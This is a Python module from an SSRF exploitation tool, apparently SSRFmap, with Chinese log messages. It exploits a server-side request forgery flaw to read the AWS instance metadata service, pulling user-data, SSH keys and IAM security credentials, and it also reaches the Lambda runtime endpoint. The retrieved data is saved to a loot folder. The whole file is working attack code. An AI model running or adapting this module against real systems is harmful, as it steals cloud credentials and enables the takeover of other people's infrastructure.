import logging

from core.utils import *

name = "aws"
description = "读取 AWS 上的敏感数据"
author = "Swissky"
documentation = [
    "https://hackerone.com/reports/53088",
    "https://hackerone.com/reports/285380",
    "https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/",
    "https://twitter.com/spengietz/status/1161317376060563456",
]


class exploit:
    endpoints = set()

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], endpoint[2])
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":
                    # 显示默认请求与 SSRF 请求之间的差异
                    logging.info(f"\033[32m读取文件\033[0m : {payload}")
                    print(diff)

                    # 将差异写入文件
                    filename = endpoint[1].split("/")[-1]
                    if filename == "":
                        filename = endpoint[1].split("/")[-2:-1][0]

                    output_path = loot_path(requester.host, filename)
                    logging.info(f"\033[32m写入文件\033[0m : {payload} 到 {output_path}")
                    output_path.write_text(diff, encoding="utf-8")

    def add_endpoints(self):
        self.endpoints.add(("169.254.169.254", "latest/user-data", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/ami-id", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/reservation-id", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/hostname", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/public-keys/0/openssh-key", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/public-keys/1/openssh-key", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/public-keys/2/openssh-key", "80"))
        self.endpoints.add(
            ("169.254.169.254", "latest/meta-data/iam/security-credentials/dummy", "80")
        )
        self.endpoints.add(
            ("169.254.169.254", "latest/meta-data/iam/security-credentials/ecsInstanceRole", "80")
        )
        self.endpoints.add(("169.254.169.254", "latest/meta-data/iam/security-credentials/", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/public-keys/", "80"))
        self.endpoints.add(("169.254.169.254", "latest/user-data/", "80"))
        self.endpoints.add(("localhost", "2018-06-01/runtime/invocation/next", "9001"))
